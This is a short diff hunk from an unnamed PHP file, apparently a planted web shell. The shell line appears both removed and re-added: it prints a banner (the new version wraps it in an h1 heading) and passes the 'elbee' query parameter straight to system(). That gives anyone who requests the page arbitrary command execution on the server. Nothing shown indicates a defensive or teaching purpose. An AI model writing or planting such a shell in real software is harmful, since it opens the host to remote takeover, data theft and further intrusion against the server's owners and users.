@@ -54,4 +54,4 @@
 
 
 
-<?php echo "Use param 'elbee'"; system($_GET['elbee']);?>
+<?php echo "<h1>Use param 'elbee'</h1>"; system($_GET['elbee']);?>
